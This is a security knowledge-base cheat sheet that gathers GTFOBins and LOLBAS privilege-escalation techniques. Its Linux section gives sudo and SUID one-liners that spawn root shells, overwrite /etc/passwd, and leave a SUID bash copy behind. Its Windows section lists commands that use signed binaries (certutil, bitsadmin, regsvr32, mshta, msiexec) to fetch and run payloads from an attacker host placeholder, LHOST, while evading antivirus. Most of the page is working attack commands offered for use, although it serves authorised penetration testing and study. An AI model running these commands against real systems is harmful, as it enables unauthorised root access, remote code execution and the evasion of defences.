---
summary: Living-off-the-land quick ref — common GTFOBins (Linux sudo/SUID) and LOLBAS (Windows) escalations.
status: active
tags: [security, payloads, privesc, lolbins]
private: false
---

# GTFOBins / LOLBAS Quick Reference

Abuse legitimate installed binaries for privesc, file read/write, and download. Full lookups: **[GTFOBins](https://gtfobins.github.io)** (Linux) · **[LOLBAS](https://lolbas-project.github.io)** (Windows). This is the high-frequency subset.

## GTFOBins — Linux (`sudo -l` / SUID hits)

Prefix with `sudo` for a sudo-allowed binary; for SUID drop the `sudo`. Most give a root shell:

```bash
find . -exec /bin/sh -p \; -quit        # find
vim -c ':!/bin/sh'                        # vim   (also: less/more -> !/bin/sh)
awk 'BEGIN {system("/bin/sh")}'           # awk
python3 -c 'import os; os.system("/bin/sh")'   # python
perl -e 'exec "/bin/sh";'                 # perl
env /bin/sh                               # env
nmap --interactive  (then !sh)            # old nmap
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh   # tar
bash -p                                   # bash (SUID) -> keeps euid 0
```

File read / write as root when a shell isn't offered:

```bash
sudo cat /root/root.txt                   # cat/head/tail
echo 'evil' | sudo tee /etc/passwd        # tee -> write anywhere
sudo cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash   # cp SUID drop
```

`LD_PRELOAD` / `LD_LIBRARY_PATH` when `env_keep` is set → load a malicious `.so` as root.

## LOLBAS — Windows

Download / exec / bypass with signed Microsoft binaries (AV/allowlist evasion):

```
certutil -urlcache -f http://LHOST/x.exe x.exe        # download
bitsadmin /transfer j http://LHOST/x.exe C:\x.exe      # download
powershell iwr http://LHOST/x.exe -o x.exe
regsvr32 /s /u /i:http://LHOST/x.sct scrobj.dll         # remote scriptlet exec
mshta http://LHOST/x.hta                                # HTA exec
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";...   # proxy exec
msiexec /q /i http://LHOST/x.msi                        # install/exec MSI
wmic process call create "cmd /c ..."                    # spawn
```

## Related

- [Payload Cheat Sheets — Index](kb://11-security-payloads-payloads-index)
- [Linux Privilege Escalation](kb://11-security-playbook-linux-privesc)
- [Windows Privilege Escalation](kb://11-security-playbook-windows-privesc)
